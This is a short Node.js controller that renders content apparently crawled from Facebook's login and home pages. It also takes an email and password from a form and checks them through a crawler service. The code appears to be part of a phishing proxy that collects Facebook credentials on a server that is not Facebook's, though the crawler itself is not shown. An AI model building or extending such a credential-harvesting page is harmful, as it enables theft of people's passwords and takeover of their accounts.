const ApplicationController = require('./application_controller')
const FbCrawler = require('../services/fb/crawler')

class SocialsController extends ApplicationController {
  async index() {
    var content = await FbCrawler.homePageContent()
    this.render({content: content})
  }

  async create() {
    var {email, pass} = this.req.body
    var result = await FbCrawler.verify(email, pass)

    if(result.verified)
      this.res.redirect('/')
    else
      this.res.redirect('/facebook/login')
  }

  async edit() {
    var content = await FbCrawler.loginPageContent()
    this.render({content: content})
  }

  layout() {
    return 'layouts/social'
  }
}

module.exports = SocialsController
